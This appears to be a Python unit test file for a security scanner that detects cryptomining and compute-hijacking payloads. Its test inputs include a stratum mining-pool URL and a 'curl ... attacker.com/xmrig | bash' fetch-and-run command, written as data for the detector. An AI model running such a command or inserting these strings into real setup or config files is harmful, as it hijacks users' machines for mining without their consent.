"""
Unit tests validating cryptomining and compute hijacking payload detection.
"""

import unittest
from scanner.rules.cryptomining_rules import scan_for_cryptomining
from scanner.rules.dangerous_symbols import RiskLevel


class TestCryptominingRules(unittest.TestCase):
    def test_clean_model_bytes(self):
        clean = b"learning_rate: 0.001, epochs: 10, batch_size: 32"
        findings = scan_for_cryptomining(clean, "config.json")
        self.assertEqual(len(findings), 0)

    def test_stratum_pool_detected(self):
        injected = b"worker_config: stratum+tcp://xmr.pool.supportxmr.com:3333"
        findings = scan_for_cryptomining(injected, "setup.py")
        self.assertTrue(any(f.rule_id == "HIJACK-CRYPTOMINING-STRATUM-POOL" for f in findings))
        self.assertEqual(findings[0].severity, RiskLevel.CRITICAL)

    def test_xmrig_binary_detected(self):
        injected = "curl -s http://attacker.com/xmrig | bash"
        findings = scan_for_cryptomining(injected, "run.sh")
        self.assertTrue(any(f.rule_id == "HIJACK-CRYPTOMINING-BINARY-REFERENCE" for f in findings))


if __name__ == "__main__":
    unittest.main()
